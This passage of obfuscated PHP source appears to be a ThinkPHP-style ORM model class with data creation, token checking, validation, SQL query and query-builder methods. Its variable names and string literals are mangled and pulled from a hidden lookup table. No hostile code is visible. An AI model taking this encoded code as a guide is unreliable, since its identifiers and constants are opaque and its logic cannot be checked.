($ØØ·â¥û == 1) { if (isset($¯ØÏÅïú[$¡ŞØ§¼”])) { $¯ØÏÅïú[$˜ÂöÈü²] = $¯ØÏÅïú[$¡ŞØ§¼”]; unset($¯ØÏÅïú[$¡ŞØ§¼”]); } } else { if (isset($¯ØÏÅïú[$˜ÂöÈü²])) { $¯ØÏÅïú[$¡ŞØ§¼”] = $¯ØÏÅïú[$˜ÂöÈü²]; unset($¯ØÏÅïú[$˜ÂöÈü²]); } } } } return $¯ØÏÅïú; } public function setField($î×Üñ¿É, $ßƒÙÖõŠ = '') { if (is_array($î×Üñ¿É)) { $·†…“ = $î×Üñ¿É; } else { $·†…“[$î×Üñ¿É] = $ßƒÙÖõŠ; } return $this->save($·†…“); } public function setAdd($ºÄ»¤´î, $—éĞŞˆ = 1) { $æ¿ü¡ =& $_SERVER[ÓïÕü]; $—“ÃÜ‚Ô = $ºÄ»¤´î . $æ¿ü¡[374] . $—éĞŞˆ; if ($—éĞŞˆ < 0) { $—“ÃÜ‚Ô = $ºÄ»¤´î . $—éĞŞˆ; } return $this->setField($ºÄ»¤´î, array($æ¿ü¡[375], $—“ÃÜ‚Ô)); } public function getField($‘ëÒà˜á, $ß›Ó¸„š = null) { $ü¦­× =& $_SERVER[ÓïÕü]; $ªÁâéúÖ[$ü¦­×[353]] = $‘ëÒà˜á; $ªÁâéúÖ = $this->_parseOptions($ªÁâéúÖ); $‘ëÒà˜á = trim($‘ëÒà˜á); if (strpos($‘ëÒà˜á, $ü¦­×[50])) { if (!isset($ªÁâéúÖ[$ü¦­×[370]])) { $ªÁâéúÖ[$ü¦­×[370]] = is_numeric($ß›Ó¸„š) ? $ß›Ó¸„š : $ü¦­×[12]; } $ŞÒú“ = $this->db->select($ªÁâéúÖ); if (!empty($ŞÒú“)) { $å’İ³˜ = explode($ü¦­×[50], $‘ëÒà˜á); $‘ëÒà˜á = array_keys($ŞÒú“[0]); $ Æ¡ÁÅ¹ = array_shift($‘ëÒà˜á); $ÜÎ²˜ÊÚ = array_shift($‘ëÒà˜á); $§•™Ôâ¾ = array(); $£ÊÛ®„× = count($å’İ³˜); foreach ($ŞÒú“ as $Æã¬»ğ‹) { $„‰­¸Œ = $Æã¬»ğ‹[$ Æ¡ÁÅ¹]; if (2 == $£ÊÛ®„×) { $§•™Ôâ¾[$„‰­¸Œ] = $Æã¬»ğ‹[$ÜÎ²˜ÊÚ]; } else { $§•™Ôâ¾[$„‰­¸Œ] = is_string($ß›Ó¸„š) ? implode($ß›Ó¸„š, $Æã¬»ğ‹) : $Æã¬»ğ‹; } } return $§•™Ôâ¾; } } else { if (!0 !== $ß›Ó¸„š) { $ªÁâéúÖ[$ü¦­×[370]] = is_numeric($ß›Ó¸„š) ? $ß›Ó¸„š : 1; } if ($ß›Ó¸„š === $ü¦­×[335]) { unset($ªÁâéúÖ[$ü¦­×[370]]); } $Æã¬»ğ‹ = $this->db->select($ªÁâéúÖ); if (!empty($Æã¬»ğ‹)) { if ($ß›Ó¸„š === $ü¦­×[335]) { return reset($Æã¬»ğ‹[0]); } if (!0 !== $ß›Ó¸„š && 1 == $ªÁâéúÖ[$ü¦­×[370]]) { return reset($Æã¬»ğ‹[0]); } foreach ($Æã¬»ğ‹ as $Ó†¼šëå) { $ª¦Èôµ[] = $Ó†¼šëå[$‘ëÒà˜á]; } return $ª¦Èôµ; } } return null; } public function create($ó‘Åõ…¤ = '', $ë¨õ¸éÀ = '') { $€Úä¥–Ü =& $_SERVER[ÓïÕü]; if (empty($ó‘Åõ…¤)) { $ó‘Åõ…¤ = $_POST; } elseif (is_object($ó‘Åõ…¤)) { $ó‘Åõ…¤ = get_object_vars($ó‘Åõ…¤); } if (empty($ó‘Åõ…¤) || !is_array($ó‘Åõ…¤)) { $this->error = think_lang($€Úä¥–Ü[351]); return !1; } $ó‘Åõ…¤ = $this->parseFieldsMap($ó‘Åõ…¤, 0); $ë¨õ¸éÀ = $ë¨õ¸éÀ ? $ë¨õ¸éÀ : (!empty($ó‘Åõ…¤[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$€Úä¥–Ü[353]])) { $€ÇöÀÌ = $this->options[$€Úä¥–Ü[353]]; unset($this->options[$€Úä¥–Ü[353]]); } elseif ($ë¨õ¸éÀ == THINK_MODEL_INSERT && isset($this->insertFields)) { $€ÇöÀÌ = $this->insertFields; } elseif ($ë¨õ¸éÀ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $€ÇöÀÌ = $this->updateFields; } if (isset($€ÇöÀÌ)) { if (is_string($€ÇöÀÌ)) { $€ÇöÀÌ = explode($€Úä¥–Ü[50], $€ÇöÀÌ); } if (think_config($€Úä¥–Ü[376])) { $€ÇöÀÌ[] = think_config($€Úä¥–Ü[377]); } foreach ($ó‘Åõ…¤ as $¶ñĞ‰„å => $ä‘Ù”Å) { if (!in_array($¶ñĞ‰„å, $€ÇöÀÌ)) { unset($ó‘Åõ…¤[$¶ñĞ‰„å]); } } } if (!$this->autoValidation($ó‘Åõ…¤, $ë¨õ¸éÀ)) { return !1; } if (!$this->autoCheckToken($ó‘Åõ…¤)) { $this->error = think_lang($€Úä¥–Ü[378]); return !1; } if ($this->autoCheckFields) { $€ÇöÀÌ = $this->getDbFields(); foreach ($ó‘Åõ…¤ as $¶ñĞ‰„å => $ä‘Ù”Å) { if (!in_array($¶ñĞ‰„å, $€ÇöÀÌ)) { unset($ó‘Åõ…¤[$¶ñĞ‰„å]); } elseif (MAGIC_QUOTES_GPC && is_string($ä‘Ù”Å)) { $ó‘Åõ…¤[$¶ñĞ‰„å] = stripslashes($ä‘Ù”Å); } } } $this->autoOperation($ó‘Åõ…¤, $ë¨õ¸éÀ); $this->data = $ó‘Åõ…¤; return $ó‘Åõ…¤; } public function autoCheckToken($Å¼Œ¼£·) { $ãŒ©Ìª =& $_SERVER[ÓïÕü]; if (isset($this->options[$ãŒ©Ìª[379]]) && !$this->options[$ãŒ©Ìª[379]]) { return !0; } if (think_config($ãŒ©Ìª[376])) { $ªøá™Ü = think_config($ãŒ©Ìª[377]); if (!isset($Å¼Œ¼£·[$ªøá™Ü]) || Session::get($ªøá™Ü)) { return !1; } list($ê¤ºİÏô, $õ¦ÅùŞš) = explode($ãŒ©Ìª[11], $Å¼Œ¼£·[$ªøá™Ü]); if ($õ¦ÅùŞš && Session::get($ªøá™Ü . $ãŒ©Ìª[10] . $ê¤ºİÏô) === $õ¦ÅùŞš) { Session::remove($ªøá™Ü . $ãŒ©Ìª[10] . $ê¤ºİÏô); return !0; } if (think_config($ãŒ©Ìª[380])) { Session::remove($ªøá™Ü . $ãŒ©Ìª[10] . $ê¤ºİÏô); } return !1; } return !0; } public function regex($¡…¿÷“³, $³²ùÉÉÖ) { $ëò½½¬É =& $_SERVER[ÓïÕü]; $øÀ‰£Çş = array($ëò½½¬É[381] => $ëò½½¬É[382], $ëò½½¬É[383] => $ëò½½¬É[384], $ëò½½¬É[385] => $ëò½½¬É[386], $ëò½½¬É[387] => $ëò½½¬É[388], $ëò½½¬É[389] => $ëò½½¬É[390], $ëò½½¬É[391] => $ëò½½¬É[392], $ëò½½¬É[393] => $ëò½½¬É[394], $ëò½½¬É[368] => $ëò½½¬É[395], $ëò½½¬É[396] => $ëò½½¬É[397]); if (isset($øÀ‰£Çş[strtolower($³²ùÉÉÖ)])) { $³²ùÉÉÖ = $øÀ‰£Çş[strtolower($³²ùÉÉÖ)]; } return preg_match($³²ùÉÉÖ, $¡…¿÷“³) === 1; } private function autoOperation(&$ÏÕ•Ü¹©, $ƒ¤şê«) { $õ²ƒê›É =& $_SERVER[ÓïÕü]; if (!empty($this->options[$õ²ƒê›É[398]])) { $¥‹»ÑÆĞ = $this->options[$õ²ƒê›É[398]]; unset($this->options[$õ²ƒê›É[398]]); } elseif (!empty($this->_auto)) { $¥‹»ÑÆĞ = $this->_auto; } if (isset($¥‹»ÑÆĞ)) { foreach ($¥‹»ÑÆĞ as $â¿İÍ”â) { if (empty($â¿İÍ”â[2])) { $â¿İÍ”â[2] = THINK_MODEL_INSERT; } if ($ƒ¤şê« == $â¿İÍ”â[2] || $â¿İÍ”â[2] == THINK_MODEL_BOTH) { switch (trim($â¿İÍ”â[3])) { case $õ²ƒê›É[399]: case $õ²ƒê›É[400]: $¼Ä“†å„ = isset($â¿İÍ”â[4]) ? (array) $â¿İÍ”â[4] : array(); if (isset($ÏÕ•Ü¹©[$â¿İÍ”â[0]])) { array_unshift($¼Ä“†å„, $ÏÕ•Ü¹©[$â¿İÍ”â[0]]); } if ($õ²ƒê›É[399] == $â¿İÍ”â[3]) { $ÏÕ•Ü¹©[$â¿İÍ”â[0]] = call_user_func_array($â¿İÍ”â[1], $¼Ä“†å„); } else { $ÏÕ•Ü¹©[$â¿İÍ”â[0]] = call_user_func_array(array(&$this, $â¿İÍ”â[1]), $¼Ä“†å„); } break; case $õ²ƒê›É[353]: $ÏÕ•Ü¹©[$â¿İÍ”â[0]] = $ÏÕ•Ü¹©[$â¿İÍ”â[1]]; break; case $õ²ƒê›É[401]: if ($õ²ƒê›É[12] === $ÏÕ•Ü¹©[$â¿İÍ”â[0]]) { unset($ÏÕ•Ü¹©[$â¿İÍ”â[0]]); } break; case $õ²ƒê›É[402]: default: $ÏÕ•Ü¹©[$â¿İÍ”â[0]] = $â¿İÍ”â[1]; } if (!1 === $ÏÕ•Ü¹©[$â¿İÍ”â[0]]) { unset($ÏÕ•Ü¹©[$â¿İÍ”â[0]]); } } } } return $ÏÕ•Ü¹©; } protected function autoValidation($ÄáÈ¶ÇÁ, $éêœ‚ô) { $‹¶¡’ò‚ =& $_SERVER[ÓïÕü]; if (!empty($this->options[$‹¶¡’ò‚[403]])) { $Òõü¨– = $this->options[$‹¶¡’ò‚[403]]; unset($this->options[$‹¶¡’ò‚[403]]); } elseif (!empty($this->_validate)) { $Òõü¨– = $this->_validate; } if (isset($Òõü¨–)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Òõü¨– as $ìÚÃÌ => $…—ø§ëŠ) { if (empty($…—ø§ëŠ[5]) || $…—ø§ëŠ[5] == THINK_MODEL_BOTH || $…—ø§ëŠ[5] == $éêœ‚ô) { if (0 == strpos($…—ø§ëŠ[2], $‹¶¡’ò‚[404]) && strpos($…—ø§ëŠ[2], $‹¶¡’ò‚[405])) { $…—ø§ëŠ[2] = think_lang(substr($…—ø§ëŠ[2], 2, -1)); } $…—ø§ëŠ[3] = isset($…—ø§ëŠ[3]) ? $…—ø§ëŠ[3] : THINK_EXISTS_VALIDATE; $…—ø§ëŠ[4] = isset($…—ø§ëŠ[4]) ? $…—ø§ëŠ[4] : $‹¶¡’ò‚[406]; switch ($…—ø§ëŠ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÄáÈ¶ÇÁ, $…—ø§ëŠ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($‹¶¡’ò‚[12] != trim($ÄáÈ¶ÇÁ[$…—ø§ëŠ[0]])) { if (!1 === $this->_validationField($ÄáÈ¶ÇÁ, $…—ø§ëŠ)) { return !1; } } break; default: if (isset($ÄáÈ¶ÇÁ[$…—ø§ëŠ[0]])) { if (!1 === $this->_validationField($ÄáÈ¶ÇÁ, $…—ø§ëŠ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($À¢»×¼ï, $¡Ğ†–Şè) { if (!1 === $this->_validationFieldItem($À¢»×¼ï, $¡Ğ†–Şè)) { if ($this->patchValidate) { $this->error[$¡Ğ†–Şè[0]] = $¡Ğ†–Şè[2]; } else { $this->error = $¡Ğ†–Şè[2]; return !1; } } return; } protected function _validationFieldItem($ÔåÇ”Šş, $Âó€íï«) { $üÄéùÃÂ =& $_SERVER[ÓïÕü]; switch (strtolower(trim($Âó€íï«[4]))) { case $üÄéùÃÂ[399]: case $üÄéùÃÂ[400]: $ü¾½ÚñÔ = isset($Âó€íï«[6]) ? (array) $Âó€íï«[6] : array(); if (is_string($Âó€íï«[0]) && strpos($Âó€íï«[0], $üÄéùÃÂ[50])) { $Âó€íï«[0] = explode($üÄéùÃÂ[50], $Âó€íï«[0]); } if (is_array($Âó€íï«[0])) { foreach ($Âó€íï«[0] as $‘°«äˆ×) { $ÍÊèÇ„İ[$‘°«äˆ×] = $ÔåÇ”Šş[$‘°«äˆ×]; } array_unshift($ü¾½ÚñÔ, $ÍÊèÇ„İ); } else { array_unshift($ü¾½ÚñÔ, $ÔåÇ”Šş[$Âó€íï«[0]]); } if ($üÄéùÃÂ[399] == $Âó€íï«[4]) { return call_user_func_array($Âó€íï«[1], $ü¾½ÚñÔ); } else { return call_user_func_array(array(&$this, $Âó€íï«[1]), $ü¾½ÚñÔ); } case $üÄéùÃÂ[407]: return $ÔåÇ”Šş[$Âó€íï«[0]] == $ÔåÇ”Šş[$Âó€íï«[1]]; case $üÄéùÃÂ[408]: if (is_string($Âó€íï«[0]) && strpos($Âó€íï«[0], $üÄéùÃÂ[50])) { $Âó€íï«[0] = explode($üÄéùÃÂ[50], $Âó€íï«[0]); } $ÄæıÈ¥¾ = array(); if (is_array($Âó€íï«[0])) { foreach ($Âó€íï«[0] as $‘°«äˆ×) { $ÄæıÈ¥¾[$‘°«äˆ×] = $ÔåÇ”Šş[$‘°«äˆ×]; } } else { $ÄæıÈ¥¾[$Âó€íï«[0]] = $ÔåÇ”Šş[$Âó€íï«[0]]; } if (!empty($ÔåÇ”Šş[$this->getPk()])) { $ÄæıÈ¥¾[$this->getPk()] = array($üÄéùÃÂ[409], $ÔåÇ”Šş[$this->getPk()]); } if ($this->where($ÄæıÈ¥¾)->find()) { return !1; } return !0; default: return $this->check($ÔåÇ”Šş[$Âó€íï«[0]], $Âó€íï«[1], $Âó€íï«[4]); } } public function check($àÓØÅ¨ˆ, $ËÔ½•ë², $ê«ú£š = "\x72\x65\x67\145\170") { $¤áÅã¿ä =& $_SERVER[ÓïÕü]; $ê«ú£š = strtolower(trim($ê«ú£š)); switch ($ê«ú£š) { case $¤áÅã¿ä[7]: case $¤áÅã¿ä[410]: $¿ÔûÓø = is_array($ËÔ½•ë²) ? $ËÔ½•ë² : explode($¤áÅã¿ä[50], $ËÔ½•ë²); return $ê«ú£š == $¤áÅã¿ä[7] ? in_array($àÓØÅ¨ˆ, $¿ÔûÓø) : !in_array($àÓØÅ¨ˆ, $¿ÔûÓø); case $¤áÅã¿ä[411]: case $¤áÅã¿ä[412]: if (is_array($ËÔ½•ë²)) { $ÓŒ¡ä¶Â = $ËÔ½•ë²[0]; $åñ†ÀÂ” = $ËÔ½•ë²[1]; } else { list($ÓŒ¡ä¶Â, $åñ†ÀÂ”) = explode($¤áÅã¿ä[50], $ËÔ½•ë²); } return $ê«ú£š == $¤áÅã¿ä[411] ? $àÓØÅ¨ˆ >= $ÓŒ¡ä¶Â && $àÓØÅ¨ˆ <= $åñ†ÀÂ” : $àÓØÅ¨ˆ < $ÓŒ¡ä¶Â || $àÓØÅ¨ˆ > $åñ†ÀÂ”; case $¤áÅã¿ä[413]: case $¤áÅã¿ä[414]: return $ê«ú£š == $¤áÅã¿ä[413] ? $àÓØÅ¨ˆ == $ËÔ½•ë² : $àÓØÅ¨ˆ != $ËÔ½•ë²; case $¤áÅã¿ä[415]: $äüáò¹¼ = mb_strlen($àÓØÅ¨ˆ, $¤áÅã¿ä[416]); if (strpos($ËÔ½•ë², $¤áÅã¿ä[50])) { list($ÓŒ¡ä¶Â, $åñ†ÀÂ”) = explode($¤áÅã¿ä[50], $ËÔ½•ë²); return $äüáò¹¼ >= $ÓŒ¡ä¶Â && $äüáò¹¼ <= $åñ†ÀÂ”; } else { return $äüáò¹¼ == $ËÔ½•ë²; } case $¤áÅã¿ä[417]: list($İÌøĞš·, $ùüü¦²ƒ) = explode($¤áÅã¿ä[50], $ËÔ½•ë²); if (!is_numeric($İÌøĞš·)) { $İÌøĞš· = strtotime($İÌøĞš·); } if (!is_numeric($ùüü¦²ƒ)) { $ùüü¦²ƒ = strtotime($ùüü¦²ƒ); } return NOW_TIME >= $İÌøĞš· && NOW_TIME <= $ùüü¦²ƒ; case $¤áÅã¿ä[418]: return in_array(get_client_ip(), explode($¤áÅã¿ä[50], $ËÔ½•ë²)); case $¤áÅã¿ä[419]: return !in_array(get_client_ip(), explode($¤áÅã¿ä[50], $ËÔ½•ë²)); case $¤áÅã¿ä[406]: default: return $this->regex($àÓØÅ¨ˆ, $ËÔ½•ë²); } } public function query($âŞÇÔ¿±, $¶µË¦ = false) { $º‡Äù¶¦ =& $_SERVER[ÓïÕü]; if (!is_bool($¶µË¦) && !is_array($¶µË¦)) { $¶µË¦ = func_get_args(); array_shift($¶µË¦); } $âŞÇÔ¿± = str_replace(array($º‡Äù¶¦[288], $º‡Äù¶¦[420]), $º‡Äù¶¦[53], $âŞÇÔ¿±); $âŞÇÔ¿± = $this->parseSql($âŞÇÔ¿±, $¶µË¦); return $this->db->query($âŞÇÔ¿±); } public function execute($‡ˆª—ğ, $¢Ïğ°¦÷ = false) { if (!is_bool($¢Ïğ°¦÷) && !is_array($¢Ïğ°¦÷)) { $¢Ïğ°¦÷ = func_get_args(); array_shift($¢Ïğ°¦÷); } $‡ˆª—ğ = $this->parseSql($‡ˆª—ğ, $¢Ïğ°¦÷); return $this->db->execute($‡ˆª—ğ); } protected function parseSql($îê²Ë©´, $œ“İĞÛ¾) { $éó‹Ê¤µ =& $_SERVER[ÓïÕü]; if (!0 === $œ“İĞÛ¾) { $¯‹Õß• = $this->_parseOptions(); $îê²Ë©´ = $this->db->parseSql($îê²Ë©´, $¯‹Õß•); } elseif (is_array($œ“İĞÛ¾)) { $œ“İĞÛ¾ = array_map(array($this->db, $éó‹Ê¤µ[421]), $œ“İĞÛ¾); $îê²Ë©´ = vsprintf($îê²Ë©´, $œ“İĞÛ¾); } else { $îê²Ë©´ = strtr($îê²Ë©´, array($éó‹Ê¤µ[422] => $this->getTableName(), $éó‹Ê¤µ[423] => think_config($éó‹Ê¤µ[324]))); } $this->db->setModel($this->name); return $îê²Ë©´; } public function db($µĞ £ = '', $ÉãÎ×“ = '', $×—Îã¤ƒ = array()) { $›ÓŠ•óÂ =& $_SERVER[ÓïÕü]; if ($›ÓŠ•óÂ[12] === $µĞ £ && $this->db) { return $this->db; } static $æ°ö×» = array(); static $¾à€€Â = array(); if (!isset($¾à€€Â[$µĞ £]) || isset($¾à€€Â[$µĞ £]) && $ÉãÎ×“ && $æ°ö×»[$µĞ £] != $ÉãÎ×“) { if (!empty($ÉãÎ×“) && is_string($ÉãÎ×“) && !1 === strpos($ÉãÎ×“, $›ÓŠ•óÂ[8])) { $ÉãÎ×“ = think_config($ÉãÎ×“); } $µĞ £ = think_guid($ÉãÎ×“); $¾à€€Â[$µĞ £] = Db::getInstance($ÉãÎ×“); } elseif (NULL === $ÉãÎ×“) { $¾à€€Â[$µĞ £]->close(); unset($¾à€€Â[$µĞ £]); return; } if (!empty($×—Îã¤ƒ)) { if (is_string($×—Îã¤ƒ)) { parse_str($×—Îã¤ƒ, $×—Îã¤ƒ); } foreach ($×—Îã¤ƒ as $£®¤«µ´ => $Ü¹ÉĞ¯ğ) { $this->setProperty($£®¤«µ´, $Ü¹ÉĞ¯ğ); } } $æ°ö×»[$µĞ £] = $ÉãÎ×“; $this->db = $¾à€€Â[$µĞ £]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÜÉï¬åö = get_class($this); if ($ÜÉï¬åö == $_SERVER[ÓïÕü][424]) { return $this->name; } $this->name = substr($ÜÉï¬åö, 0, -5); } return $this->name; } public function getTableName() { $ÒÛ¹Ù© =& $_SERVER[ÓïÕü]; if (empty($this->trueTableName)) { $’¥’äø» = !empty($this->tablePrefix) ? $this->tablePrefix : $ÒÛ¹Ù©[12]; if (!empty($this->tableName)) { $’¥’äø» .= $this->tableName; } else { $’¥’äø» .= think_parse_name($this->name); } $this->trueTableName = strtolower($’¥’äø»); } return (!empty($this->dbName) ? $this->dbName . $ÒÛ¹Ù©[10] : $ÒÛ¹Ù©[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $äğß«ªœ =& $_SERVER[ÓïÕü]; return isset($this->fields[$äğß«ªœ[331]]) ? $this->fields[$äğß«ªœ[331]] : $this->pk; } public function getDbFields() { $¶Ô‡¢¥õ =& $_SERVER[ÓïÕü]; if (isset($this->options[$¶Ô‡¢¥õ[359]])) { $¹‰Öá±ß = $this->db->getFields($this->options[$¶Ô‡¢¥õ[359]]); return $¹‰Öá±ß ? array_keys($¹‰Öá±ß) : !1; } if ($this->fields) { $¹‰Öá±ß = $this->fields; unset($¹‰Öá±ß[$¶Ô‡¢¥õ[330]], $¹‰Öá±ß[$¶Ô‡¢¥õ[331]], $¹‰Öá±ß[$¶Ô‡¢¥õ[332]], $¹‰Öá±ß[$¶Ô‡¢¥õ[329]]); return $¹‰Öá±ß; } return !1; } public function data($ŒÍŠï×ó = '') { $¤‡Œ²µ =& $_SERVER[ÓïÕü]; if ($¤‡Œ²µ[12] === $ŒÍŠï×ó && !empty($this->data)) { return $this->data; } if (is_object($ŒÍŠï×ó)) { $ŒÍŠï×ó = get_object_vars($ŒÍŠï×ó); } elseif (is_string($ŒÍŠï×ó)) { parse_str($ŒÍŠï×ó, $ŒÍŠï×ó); } elseif (!is_array($ŒÍŠï×ó)) { think_exception(think_lang($¤‡Œ²µ[351])); } $this->data = $ŒÍŠï×ó; return $this; } public function join($ôµ—ı¶¢) { $¾¦èÎÏ€ =& $_SERVER[ÓïÕü]; if (is_array($ôµ—ı¶¢)) { $this->options[$¾¦èÎÏ€[362]] = $ôµ—ı¶¢; } elseif (!empty($ôµ—ı¶¢)) { $this->options[$¾¦èÎÏ€[362]][] = $ôµ—ı¶¢; } return $this; } public function union($¥¤²ÁÖ£, $¢îµŸÃ¦ = false) { $İ°‰ğĞè =& $_SERVER[ÓïÕü]; if (empty($¥¤²ÁÖ£)) { return $this; } if ($¢îµŸÃ¦) { $this->options[$İ°‰ğĞè[425]][$İ°‰ğĞè[426]] = !0; } if (is_object($¥¤²ÁÖ£)) { $¥¤²ÁÖ£ = get_object_vars($¥¤²ÁÖ£); } if (is_string($¥¤²ÁÖ£)) { $—³ “ã· = $¥¤²ÁÖ£; } elseif (is_array($¥¤²ÁÖ£)) { if (isset($¥¤²ÁÖ£[0])) { $this->options[$İ°‰ğĞè[425]] = array_merge($this->options[$İ°‰ğĞè[425]], $¥¤²ÁÖ£); return $this; } else { $—³ “ã· = $¥¤²ÁÖ£; } } else { think_exception(think_lang($İ°‰ğĞè[351])); } $this->options[$İ°‰ğĞè[425]][] = $—³ “ã·; return $this; } public function cache($Š±Ä¡Ñ = true, $“ì½¼“´ = null, $‹¾ ò¿ = '') { $œğİŠ¿ =& $_SERVER[ÓïÕü]; if (!1 !== $Š±Ä¡Ñ) { $this->options[$œğİŠ¿[427]] = array($œğİŠ¿[97] => $Š±Ä¡Ñ, $œğİŠ¿[417] => $“ì½¼“´, $œğİŠ¿[33] => $‹¾ ò¿); } return $this; } public function field($Å€³–ò€, $’ÒúÎÂ = false) { $¥¶šÚ¹Ç =& $_SERVER[ÓïÕü]; if (!0 === $Å€³–ò€) { $”Ù–„€Ü = $this->getDbFields(); $Å€³–ò€ = $”Ù–„€Ü ? $”Ù–„€Ü : $¥¶šÚ¹Ç[223]; } elseif ($’ÒúÎÂ) { if (is_string($Å€³–ò€)) { $Å€³–ò€ = explode($¥¶šÚ¹Ç[50], $Å€³–ò€); } $”Ù–„€Ü = $this->getDbFields(); $Å€³–ò€ = $”Ù–„€Ü ? array_diff($”Ù–„€Ü, $Å€³–ò€) : $Å€³–ò€; } $this->options[$¥¶šÚ¹Ç[353]] = $Å€³–ò€; return $this; } public function scope($ÖâÜĞº = '', $Ø¾Ô¬³‰ = NULL) { $ŒÓÆû²İ =& $_SERVER[ÓïÕü]; if ($ŒÓÆû²İ[12] === $ÖâÜĞº) { if (isset($this->_scope[$ŒÓÆû²İ[37]])) { $½•Æ³˜ = $this->_scope[$ŒÓÆû²İ[37]]; } else { return $this; } } elseif (is_string($ÖâÜĞº)) { $“âäèÆœ = explode($ŒÓÆû²İ[50], $ÖâÜĞº); $½•Æ³˜ = array(); foreach ($“âäèÆœ as $§î‡Î§’) { if (!isset($this->_scope[$§î‡Î§’])) { continue; } $½•Æ³˜ = array_merge($½•Æ³˜, $this->_scope[$§î‡Î§’]); } if (!empty($Ø¾Ô¬³‰) && is_array($Ø¾Ô¬³‰)) { $½•Æ³˜ = array_merge($½•Æ³˜, $Ø¾Ô¬³‰); } } elseif (is_array($ÖâÜĞº)) { $½•Æ³˜ = $ÖâÜĞº; } if (is_array($½•Æ³˜) && !empty($½•Æ³˜)) { $this->options = array_merge($this->options, array_change_key_case($½•Æ³˜)); } return $this; } public function where($ÖºìÕÕİ, $´ÅŞ—ì = null) { $‘›†°Î =& $_SERVER[ÓïÕü]; if (!is_null($´ÅŞ—ì) && is_string($ÖºìÕÕİ)) { if (!is_array($´ÅŞ—ì)) { $´ÅŞ—ì = func_get_args(); array_shift($´ÅŞ—ì); } $´ÅŞ—ì = array_map(array($this->db, $‘›†°Î[421]), $´ÅŞ—ì); $ÖºìÕÕİ = vsprintf($ÖºìÕÕİ, $´ÅŞ—ì); } elseif (is_object($ÖºìÕÕİ)) { $ÖºìÕÕİ = get_object_vars($ÖºìÕÕİ); } elseif (is_array($ÖºìÕÕİ)) { foreach ($ÖºìÕÕİ as $¢ìÃä œ => $”¿È ¸) { if ((is_numeric($¢ìÃä œ) || !$¢ìÃä œ) && is_string($”¿È ¸)) { if (strpos($”¿È ¸, $‘›†°Î[428]) === 0) { continue; } think_trace($‘›†°Î[429], $‘›†°Î[12], $‘›†°Î[49]); die; } } } if (is_string($ÖºìÕÕİ) && $‘›†°Î[12] != $ÖºìÕÕİ) { $î¯ĞÛÛÙ = array(); $î¯ĞÛÛÙ[$‘›†°Î[430]] = $ÖºìÕÕİ; $ÖºìÕÕİ = $î¯ĞÛÛÙ; } if (isset($this->options[$‘›†°Î[355]])) { $this->options[$‘›†°Î[355]] = array_merge($this->options[$‘›†°Î[355]], $ÖºìÕÕİ); } else { $this->options[$‘›†°Î[355]] = $ÖºìÕÕİ; } return $this; } public function limit($¡•¥™, $ÊµıÇ¡Ï = null) { $¥’Ã•ª =& $_SERVER[ÓïÕü]; $this->options[$¥’Ã•ª[370]] = is_null($ÊµıÇ¡Ï) ? $¡•¥™ : $¡•¥™ . $¥’Ã•ª[50] . $ÊµıÇ¡Ï; return $this; } public function page($ª›àĞü´, $œË‹¥„™ = null) { $ÖêÔ… =& $_SERVER[ÓïÕü]; $this->options[$ÖêÔ…[431]] = is_null($œË‹¥„™) ? $ª›àĞü´ : $ª›àĞü´ . $ÖêÔ…[50] . $œË‹¥„™; return $this; } public function comment($×ôòÔÏ£) { $this->options[$_SERVER[ÓïÕü][432]] = $×ôòÔÏ£; return $this; } public function setProperty($¥Á¨¿Åû, $Ì’ÀË±) { if (property_exists($this, $¥Á¨¿Åû)) { $this->{$¥Á¨¿Åû} = $Ì’ÀË±; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\146\x79\124\151\x6d\145", "\164\151\155\145", "\x69\156\x73\x65\x72\164\x2c\x75\x70\x64\141\x74\x65", "\x66\165\x6e\143\164\x69\x6f\x6e"), array("\x63\162\x65\x61\x74\x65\x54\151\155\x65", "\164\x69\155\145", "\151\156\x73\145\162\164", "\146\x75\x6e\143\x74\151\x6f\x6e")); public function setDataAuto($îõâÑÀ) { $this->dataAuto = $îõâÑÀ; } public function __construct($œç··æ¡ = '', $¡ÈøÁ›ú = '', $ñÚ°×šö = '') { parent::__construct($œç··æ¡, $¡ÈøÁ›ú, $ñÚ°×šö); } protected $tableMeta = array(); protected function _beforeInsert(&$“‰ÜµÎ‰, $„øäò¸Ò) { $†Óóó =& $_SERVER[ÓïÕü]; if (!$this->checkDataAutoHas($†Óóó[433])) { return; } $this->dataBeforeFilter($“‰ÜµÎ‰, $†Óóó[433]); } protected function _beforeUpdate(&$ß°¯ÏÚ¬, $–»ÑøÎœ) { $Å³ÎË =& $_SERVER[ÓïÕü]; if (!$this->checkDataAutoHas($Å³ÎË[434])) { return; } $this->dataBeforeFilter($ß°¯ÏÚ¬, $Å³ÎË[434]); } protected function _afterSelect(&$ŞÁÚƒş, $êŠ‰Ë) { if (!is_array($ŞÁÚƒş)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÓïÕü][435])) { return; } foreach ($ŞÁÚƒş as &$ÃÓÇìì½) { $this->dataAfterFilter($ÃÓÇìì½); } unset($ÃÓÇìì½); } protected function _afterFind(&$ªëä”éõ, $¨ÙÒÂÑ¥) { if (!is_array($ªëä”éõ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÓïÕü][435])) { return; } $this->dataAfterFilter($ªëä”éõ); } public static function textEncode($‚ëÛØìû) { if (!$‚ëÛØìû) { return $‚ëÛØìû; } $Ñ˜òè­¤ = json_encode($‚ëÛØìû); $Ñ˜òè­¤ = preg_replace_callback($_SERVER[ÓïÕü][436], function ($“Âëì˜ß) { return addslashes($“Âëì˜ß[0]); }, $Ñ˜òè­¤); return json_decode($Ñ˜òè­¤); } public static function 